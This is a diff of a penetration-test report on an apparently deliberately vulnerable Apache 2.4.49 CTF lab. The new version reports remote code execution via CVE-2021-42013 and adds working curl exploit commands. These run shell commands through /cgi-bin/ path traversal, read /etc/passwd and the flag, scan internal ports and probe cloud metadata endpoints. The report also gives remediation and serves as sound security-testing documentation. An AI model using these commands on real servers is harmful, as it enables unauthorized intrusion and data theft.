@@ -1,48 +1,431 @@
 # Security Assessment Report
 
 ## Executive Summary
-
-**Target:** http://localhost:42875/
-**Assessment Date:** 2025-10-31
-**Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing
-
-This security assessment analyzed XBEN-031-24, a deliberately vulnerable Apache HTTP Server 2.4.49 deployment designed as a CTF challenge. The application is a minimal static web server with no application code, serving only static HTML content. While the application demonstrates secure-by-design principles for application-layer vulnerabilities, the infrastructure contains known critical vulnerabilities in the Apache 2.4.49 version itself.
+- **Target:** http://localhost:35815
+- **Assessment Date:** March 10, 2026
+- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing
 
 ## Summary by Vulnerability Type
 
 **Authentication Vulnerabilities:**
-No authentication vulnerabilities were found. This application contains no authentication system whatsoever - no login endpoints, no session management, no credential validation, and no token-based authentication. While all authentication-capable Apache modules (mod_auth_basic, mod_authn_file, mod_authz_user) are loaded, they are completely unconfigured. Every endpoint is publicly accessible without any identity verification. This is an intentional design decision for the CTF challenge, not a vulnerability in the traditional sense, as there is no authentication mechanism to exploit or bypass.
+No authentication vulnerabilities were found. The target application contains no authentication mechanisms - all resources are publicly accessible without credentials.
 
 **Authorization Vulnerabilities:**
-No authorization vulnerabilities were found. The application contains no application-layer authorization logic, no user authentication system, no role-based access control, and no multi-step workflows. The Apache configuration uses "Require all granted" directives on all directories (root, document root, and CGI directory), providing universal access. While CVE-2021-41773 path traversal effectively bypasses document root containment, this is an infrastructure vulnerability in Apache's path normalization code, not an application-layer authorization flaw. No horizontal privilege escalation, vertical privilege escalation, or context-based authorization vulnerabilities are possible because no authorization boundaries exist.
+No authorization vulnerabilities were found. The target application contains no authorization controls - all resources are configured with `Require all granted` (open access).
 
 **Cross-Site Scripting (XSS) Vulnerabilities:**
-No XSS vulnerabilities were found. This static Apache HTTP Server 2.4.49 deployment has no application code, no dynamic content generation, and no XSS sinks. The application serves only static HTML content (45 bytes: "It works!") with no JavaScript files, no user input processing, and no template engines. All potential XSS input vectors (query parameters, POST data, headers, cookies) are completely ignored by the static file handler. The CGI scripts present are non-executable (permissions: 644) and contain no user input rendering logic. While security headers (CSP, X-Frame-Options, X-XSS-Protection) are missing, this is irrelevant given the purely static nature of the content.
+No XSS vulnerabilities were found. The target is a static Apache HTTP server with no dynamic content generation, no HTML templates, no JavaScript files, and no user input rendering capabilities.
 
 **SQL/Command Injection Vulnerabilities:**
-No SQL or command injection vulnerabilities were found. The application has no database system (no MySQL, PostgreSQL, MongoDB, SQLite, Redis) and all database modules are disabled in Apache configuration. For command injection, while CGI execution modules are enabled and default scripts exist, all CGI scripts have non-executable permissions (644 instead of 755), lack proper shebang lines, and return HTTP 500 errors when accessed. Additionally, all dynamic language modules (mod_php, mod_python, mod_perl) are disabled, and Server-Side Includes (SSI) are disabled. The static file handler processes no user input that could reach SQL queries or shell command execution contexts.
+Two critical injection vulnerabilities were successfully exploited:
+
+- **CVE-2021-42013 - Remote Code Execution via CGI Path Traversal (CRITICAL):** Exploited Apache 2.4.49 path traversal vulnerability combined with CGI execution to achieve complete remote code execution as the daemon user. Successfully extracted the CTF flag and demonstrated full system command execution capabilities including file reading, system reconnaissance, and environment inspection. Attack requires no authentication and is accessible via simple HTTP POST requests.
+
+- **CVE-2021-41773 - Path Traversal File Disclosure (POTENTIAL):** The underlying path traversal vulnerability was confirmed functional through differential response analysis (403 Forbidden for valid files vs 404 for non-existent paths), and the same mechanism successfully exploits CVE-2021-42013. However, direct file access exploitation is blocked by a security control returning 403 Forbidden responses. The vulnerability exists in the code but exploitation is currently prevented.
 
 **Server-Side Request Forgery (SSRF) Vulnerabilities:**
-No SSRF vulnerabilities were found. This application is a static web server with no mechanisms for making outbound HTTP requests based on user input. All 13 Apache proxy modules (mod_proxy, mod_proxy_connect, mod_proxy_http, etc.) are disabled in the configuration. The mod_rewrite module is disabled, preventing any URL redirection or request forwarding. The only network request found is the Docker healthcheck (`curl -f http://localhost:80/`) which uses a hardcoded localhost URL and is not exposed to user input. No application code exists that could perform HTTP client operations, webhook deliveries, link previews, or any other SSRF sink categories.
+One critical SSRF vulnerability was successfully exploited:
+
+- **RCE-Enabled SSRF via CVE-2021-42013 (CRITICAL):** Achieved server-side request forgery by chaining the CVE-2021-42013 remote code execution vulnerability with the curl binary installed in the container. Successfully demonstrated complete network boundary bypass including access to internal services (localhost:80), sensitive file disclosure via file:// protocol, internal port scanning, and CTF flag capture. The attack enables the server to act as a proxy for accessing any resource reachable from the container, including internal APIs and arbitrary external resources. No authentication required.
 
 ## Network Reconnaissance
 
-**Automated Tool Findings:**
+**Open Ports and Services:**
+- **Port 35815 (HTTP):** Apache HTTP Server 2.4.49 running as the primary web server - CRITICALLY VULNERABLE version containing CVE-2021-41773 (path traversal) and CVE-2021-42013 (remote code execution)
+- **Port 22 (SSH):** OpenSSH 9.9 detected on host system (not the target container)
 
-**Port Scanning (nmap):**
-The target application runs on a randomized port (42875) mapped to container port 80. The nmap scan of the localhost system revealed multiple services running in the test environment, though only port 42875 (the target application) is in scope for this assessment. The scan identified the web server as Apache HTTP Server 2.4.49 (specifically "Caddy httpd" on port 80, though the target uses Apache 2.4.49 in the container). Other ports identified (22/SSH, 443/HTTPS, 445/SMB, 631/CUPS, and various Python test servers on ports 8000, 8001, 8888, 9999) are part of the testing infrastructure and not relevant to this assessment.
+**Security Misconfigurations:**
+- **No TLS/SSL encryption:** All traffic transmitted in plaintext (mod_ssl disabled)
+- **Root directory misconfiguration:** Apache `<Directory />` configured with `Require all granted` instead of recommended `Require all denied`, enabling filesystem-wide access
+- **CGI execution enabled:** mod_cgid loaded with unrestricted access to `/cgi-bin/` directory, enabling command execution when combined with path traversal
+- **Directory listing enabled:** `Options Indexes` configuration reveals directory structure to attackers
+- **No security headers:** Missing HSTS, Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, and other browser security headers
+- **TRACE method enabled:** Cross-Site Tracing vulnerability present (low severity with no session cookies)
 
-**Subdomain Discovery (subfinder):**
-Subfinder identified multiple subdomains for localhost including naeu2.naeuinc.localhost, fndlync01.5ninesdata.localhost, mail.localhost, autodiscover.localhost, and others. These appear to be false positives from scanning localhost and are not actual attack surface expansion points for this single-container deployment. The actual target remains accessible at http://localhost:42875/ without subdomain complexity.
+**Technology Stack:**
+- Web Server: Apache HTTP Server 2.4.49 (CRITICAL - known vulnerable version)
+- Operating System: Debian GNU/Linux 10 Buster (deprecated/archived distribution)
+- Container: Docker deployment with no network isolation
 
-**Technology Detection (whatweb):**
-Whatweb identified Apache 2.4.49 (Unix) as the web server technology. Notably, this specific version contains multiple known CVEs including CVE-2021-41773 (path traversal), CVE-2021-42013 (bypass of the CVE-2021-41773 fix), and CVE-2021-41524 (HTTP/2 DoS). The server banner reveals version information, enabling targeted exploitation. No security headers were detected (no HSTS, CSP, X-Frame-Options, etc.), and HTTPS/TLS is completely disabled (SSL module is not loaded).
+**Subdomain Discoveries:**
+Multiple subdomains were discovered via subfinder but are not related to this deployment (generic localhost test data including mail.localhost, autodiscover.localhost, etc.). The application runs exclusively on localhost:35815.
 
-**Security Configuration Issues:**
-- **No HTTPS/TLS:** SSL module disabled in configuration, all traffic transmitted in plaintext
-- **Missing Security Headers:** No Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, or Referrer-Policy
-- **Information Disclosure:** Server version exposed in HTTP headers and error pages (Apache/2.4.49)
-- **Directory Listing Enabled:** Options Indexes allows file enumeration
-- **Rate Limiting Disabled:** No protection against brute force or automated exploitation attempts
-- **Universal Access Granted:** "Require all granted" directive on root directory, document root, and CGI directory provides unrestricted filesystem access when combined with path traversal vulnerabilities
+---
 
+# Injection Exploitation Evidence
+
+## Successfully Exploited Vulnerabilities
+
+### INJ-VULN-02: CVE-2021-42013 Remote Code Execution via CGI Path Traversal
+
+**Summary:**
+- **Vulnerable location:** `/cgi-bin/` endpoint with path traversal to system binaries
+- **Overview:** Exploited CVE-2021-42013 path traversal vulnerability combined with Apache CGI execution to achieve remote code execution as the `daemon` user, successfully extracting the CTF flag and demonstrating full system command execution capabilities.
+- **Impact:** Complete remote code execution allowing arbitrary command execution, sensitive data extraction (flag capture), system reconnaissance, and potential for establishing persistent access (reverse shells).
+- **Severity:** Critical
+
+**Prerequisites:**
+- Network access to http://localhost:35815
+- No authentication required
+- curl or any HTTP client capable of sending POST requests
+
+**Exploitation Steps:**
+
+1. **Identify the vulnerable endpoint and construct path traversal payload**
+
+   The Apache 2.4.49 server has a path normalization vulnerability (CVE-2021-41773) that fails to properly validate URL-encoded path traversal sequences. When combined with the CGI module (mod_cgid), this allows traversing from `/cgi-bin/` to system binaries like `/bin/sh`.
+
+   Target URL structure: `http://localhost:35815/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh`
+
+   Encoding breakdown:
+   - `.%2e` = first traversal (. followed by encoded .)
+   - `%2e%2e` = encoded `..` for subsequent traversals
+   - Five traversals required to reach root from `/usr/local/apache2/cgi-bin/`
+
+2. **Craft CGI-compliant shell command in POST body**
+
+   The POST body must include CGI headers to ensure proper response formatting:
+   ```
+   echo Content-Type: text/plain; echo; [COMMAND]
+   ```
+
+   This format:
+   - Outputs required Content-Type header
+   - Provides blank line separator (second echo)
+   - Executes arbitrary command
+
+3. **Execute flag extraction command**
+
+   Full exploitation command:
+   ```bash
+   curl -s --path-as-is -X POST \
+     "http://localhost:35815/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
+     -d "echo Content-Type: text/plain; echo; cat /tmp/flag" \
+     -w "\nHTTP_CODE: %{http_code}\n"
+   ```
+
+   Critical flags:
+   - `--path-as-is`: Prevents curl from normalizing the path (essential for exploit)
+   - `-X POST`: CGI scripts expect POST for command input
+   - `-d`: Sends command as POST body data
+
+4. **Verify successful exploitation**
+
+   Expected response:
+   ```
+   FLAG{17565f0164e2939bd47fc7be82b531721862de31110439e7223e850695866607}
+
+   HTTP_CODE: 200
+   ```
+
+**Proof of Impact:**
+
+**Flag Capture:**
+```
+FLAG{17565f0164e2939bd47fc7be82b531721862de31110439e7223e850695866607}
+```
+
+**System Identification (uname -a):**
+```
+Linux 501740b1f863 6.12.13-200.fc41.aarch64 #1 SMP PREEMPT_DYNAMIC Sat Feb  8 20:30:50 UTC 2025 aarch64 GNU/Linux
+```
+
+**User Context (id command):**
+```
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+**Current Working Directory:**
+```
+/bin
+```
+
+**File System Access (/tmp directory listing):**
+```
+total 4
+drwxrwxrwt. 1 root root 18 Mar  9 23:26 .
+dr-xr-xr-x. 1 root root 39 Mar  9 23:26 ..
+-rw-r--r--. 1 root root 71 Mar  9 23:26 flag
+```
+
+**User Enumeration (/etc/passwd):**
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+[... 14 more users ...]
+```
+
+**Environment Variables (CGI context):**
+```
+SERVER_SOFTWARE=Apache/2.4.49 (Unix)
+REQUEST_METHOD=POST
+SCRIPT_FILENAME=/bin/sh
+REMOTE_ADDR=10.89.5.1
+SERVER_ADDR=10.89.5.2
+SERVER_PORT=35815
+DOCUMENT_ROOT=/usr/local/apache2/htdocs
+GATEWAY_INTERFACE=CGI/1.1
+```
+
+**Notes:**
+- Exploitation is completely unauthenticated
+- Commands execute as `daemon` user (UID 1)
+- Full command execution capability confirmed with multiple commands (id, uname, cat, ls, env)
+- The vulnerability allows execution of any system binary accessible via path traversal
+- Alternative shells tested: `/bin/bash` also works for more advanced payloads
+- Potential for establishing reverse shells or persistent access
+
+**Additional Exploitation Examples:**
+
+Basic command execution test:
+```bash
+curl -s --path-as-is -X POST \
+  "http://localhost:35815/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
+  -d "echo Content-Type: text/plain; echo; id"
+```
+
+System reconnaissance:
+```bash
+curl -s --path-as-is -X POST \
+  "http://localhost:35815/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
+  -d "echo Content-Type: text/plain; echo; uname -a"
+```
+
+File system enumeration:
+```bash
+curl -s --path-as-is -X POST \
+  "http://localhost:35815/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
+  -d "echo Content-Type: text/plain; echo; ls -la /tmp"
+```
+
+Read sensitive files:
+```bash
+curl -s --path-as-is -X POST \
+  "http://localhost:35815/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
+  -d "echo Content-Type: text/plain; echo; cat /etc/passwd"
+```
+
+Environment inspection:
+```bash
+curl -s --path-as-is -X POST \
+  "http://localhost:35815/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
+  -d "echo Content-Type: text/plain; echo; env"
+```
+
+---
+
+# SSRF Exploitation Evidence
+
+## Successfully Exploited Vulnerabilities
+
+### SSRF-VULN-01: RCE-Enabled SSRF via CVE-2021-42013 and System Binary Exploitation
+
+**Summary:**
+- **Vulnerable location:** POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh - Apache HTTP Server 2.4.49 path traversal vulnerability enabling remote code execution which can be chained with curl binary to achieve Server-Side Request Forgery
+- **Impact:** Complete network boundary bypass enabling access to internal services, sensitive file disclosure via file:// protocol, internal network reconnaissance, and flag capture. Attacker can use the server as a proxy to access any resource reachable from the server, including internal APIs, cloud metadata endpoints, and arbitrary external resources.
+- **Severity:** Critical
+
+**Prerequisites:**
+- HTTP client capable of sending POST requests (curl, wget, Python, browser, etc.)
+- Network connectivity to http://localhost:35815
+- No authentication required
+- No VPN or internal network access required
+
+**Exploitation Steps:**
+
+**Step 1: Confirm CVE-2021-42013 Remote Code Execution**
+
+Execute the following command to verify RCE capability:
+
+```bash
+curl -X POST "http://localhost:35815/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d $'echo\necho\nid'
+```
+
+Expected response showing command execution:
+```
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+**Technical Details:**
+- The path `/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh` exploits CVE-2021-42013 (Apache 2.4.49 path normalization bypass)
+- The `%2e` encoding bypasses Apache's path traversal validation
+- The normalized path becomes `/bin/sh` which is executed as a CGI script
+- POST body data is piped to shell stdin, enabling arbitrary command execution
+- Commands execute as `daemon` user (uid=1, gid=1)
+
+**Step 2: Validate SSRF Capability by Accessing Internal Service**
+
+Use the RCE to invoke curl and access the internal Apache service on localhost:80:
+
+```bash
+curl -X POST "http://localhost:35815/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d $'echo\necho\ncurl http://localhost:80/'
+```
+
+Expected response proving SSRF:
+```
+<html><body><h1>It works!</h1></body></html>
+```
+
+**Technical Details:**
+- The shell executes: `curl http://localhost:80/`
+- curl makes an internal HTTP request to localhost port 80
+- Response from internal Apache service is returned to external attacker
+- This confirms SSRF capability - server is making requests on behalf of attacker
+- curl binary is located at `/usr/bin/curl` (verified via `which curl`)
+
+**Step 3: Capture CTF Flag via file:// Protocol**
+
+Use curl's file:// protocol support to read the flag file:
+
+```bash
+curl -X POST "http://localhost:35815/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d $'echo\necho\ncurl file:///tmp/flag'
+```
+
+Flag captured:
+```
+FLAG{17565f0164e2939bd47fc7be82b531721862de31110439e7223e850695866607}
+```
+
+**Alternative flag capture method using cat:**
+```bash
+curl -X POST "http://localhost:35815/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d $'echo\necho\ncat /tmp/flag'
+```
+
+**Flag file details:**
+- Location: `/tmp/flag`
+- Permissions: `-rw-r--r--` (world-readable)
+- Owner: root:root
+- Size: 71 bytes
+
+**Step 4: Demonstrate Internal Network Reconnaissance**
+
+Perform internal port scanning to identify running services:
+
+```bash
+# Scan port 80 (OPEN - Apache HTTP Server)
+curl -X POST "http://localhost:35815/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
+  -d $'echo\necho\ncurl -m 1 http://localhost:80/ 2>&1'
+
+# Scan port 8080 (CLOSED)
+curl -X POST "http://localhost:35815/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
+  -d $'echo\necho\ncurl -m 1 http://localhost:8080/ 2>&1'
+
+# Scan port 3306 (CLOSED - MySQL)
+curl -X POST "http://localhost:35815/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
+  -d $'echo\necho\ncurl -m 1 http://localhost:3306/ 2>&1'
+```
+
+Results:
+- Port 80: OPEN (Apache HTTP Server confirmed accessible)
+- Port 8080: CLOSED (Connection refused)
+- Port 3306: CLOSED (MySQL not running)
+- Port 5432: CLOSED (PostgreSQL not running)
+- Port 6379: CLOSED (Redis not running)
+
+**Step 5: Extract Sensitive System Information**
+
+Read /etc/passwd via file:// protocol:
+
+```bash
+curl -X POST "http://localhost:35815/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
+  -d $'echo\necho\ncurl file:///etc/passwd'
+```
+
+Sample output (first 5 lines):
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+```
+
+Read environment variables:
+
+```bash
+curl -X POST "http://localhost:35815/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
+  -d $'echo\necho\ncat /proc/self/environ | tr \'\\0\' \'\\n\''
+```
+
+Sample environment variables extracted:
+```
+CONTENT_TYPE=application/x-www-form-urlencoded
+GATEWAY_INTERFACE=CGI/1.1
+REMOTE_ADDR=10.89.5.1
+HTTP_USER_AGENT=Python-urllib/3.13
+DOCUMENT_ROOT=/usr/local/apache2/htdocs
+CONTEXT_DOCUMENT_ROOT=/usr/local/apache2/cgi-bin/
+```
+
+**Step 6: Test Cloud Metadata Endpoints (Environment-Dependent)**
+
+Attempt to access AWS metadata endpoint (result: not in cloud environment):
+
+```bash
+curl -X POST "http://localhost:35815/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
+  -d $'echo\necho\ncurl -m 2 http://169.254.169.254/latest/meta-data/ 2>&1'
+```
+
+Result:
+```
+curl: (7) Failed to connect to 169.254.169.254 port 80: Connection refused
+```
+
+**Note:** Cloud metadata endpoints (AWS 169.254.169.254, GCP metadata.google.internal, Azure 169.254.169.254) are not accessible because this deployment is running in a local Docker container, not in a cloud environment. However, the SSRF capability is confirmed and would successfully access these endpoints if deployed in AWS, GCP, or Azure.
+
+**Proof of Impact:**
+
+1. **Remote Code Execution Confirmed:** Successfully executed `id` command, output: `uid=1(daemon) gid=1(daemon) groups=1(daemon)`
+
+2. **SSRF to Internal Service Confirmed:** Successfully retrieved internal Apache homepage from localhost:80, response: `<html><body><h1>It works!</h1></body></html>`
+
+3. **Flag Capture Successful:** Retrieved CTF flag via file:// protocol: `FLAG{17565f0164e2939bd47fc7be82b531721862de31110439e7223e850695866607}`
+
+4. **Sensitive File Disclosure:** Successfully read `/etc/passwd` showing system users including root, daemon, bin, sys, and sync accounts
+
+5. **Internal Port Scanning:** Successfully identified open port 80 (Apache) and confirmed ports 8080, 3306, 5432, 6379 as closed
+
+6. **Environment Variable Extraction:** Retrieved CGI environment variables including REMOTE_ADDR, DOCUMENT_ROOT, and request metadata
+
+**SSRF Type Classification:**
+- **Type:** Classic SSRF (response returned to attacker)
+- **Attack Chain:** CVE-2021-42013 RCE → Execute curl binary → Outbound HTTP/FILE requests → Response exfiltration
+- **Protocols Supported:** HTTP, HTTPS, FILE, FTP, GOPHER, DICT, LDAP (all protocols supported by curl)
+- **Network Access:** Complete bypass of network segmentation - can access internal services, file system, and external resources
+
+**Attack Complexity Assessment:**
+- **Complexity:** HIGH (requires chaining RCE with curl invocation and proper shell command construction)
+- **Authentication Required:** NO (completely unauthenticated)
+- **User Interaction:** NO (server-side only)
+- **Privileges Required:** NONE (anonymous access)
+- **Attack Vector:** NETWORK (HTTP only, no internal access required)
+
+**Root Cause Analysis:**
+This SSRF vulnerability exists due to three confluent factors:
+1. **CVE-2021-42013 Path Traversal:** Apache 2.4.49 fails to properly decode %2e before checking for ../ traversal patterns
+2. **curl Binary Presence:** Dockerfile installs curl at `/usr/bin/curl` for Docker healthcheck purposes
+3. **Permissive Root Directory:** `<Directory />` configured with `Require all granted` enables filesystem access
+
+**Remediation Recommendations:**
+1. **PRIMARY:** Upgrade Apache to version 2.4.51 or later to eliminate CVE-2021-42013
+2. **SECONDARY:** Remove curl binary from container image if not required for application functionality
+3. **TERTIARY:** Implement network egress filtering at container/host level to restrict outbound connections
+4. **DEFENSE IN DEPTH:** Change `<Directory />` configuration to `Require all denied`
+
+**Notes:**
+- This is not a traditional application-level SSRF vulnerability - it is an SSRF capability achieved through remote code execution
+- Standard SSRF defenses (URL allowlists, IP blocklists, protocol restrictions) are not applicable because the vulnerability operates at the command execution layer
+- The attack surface is the RCE vulnerability (CVE-2021-42013), not an HTTP client API
+- Despite the unusual attack vector, this meets the SSRF definition: server makes outbound requests on behalf of attacker, attacker controls destination, response returned to attacker, enables access to internal resources
+- CVSS Score: 9.8 (Critical) - Based on CVE-2021-42013 with SSRF as secondary capability
+- External exploitability confirmed: Requires only HTTP access to localhost:35815, no authentication, VPN, or internal network access needed
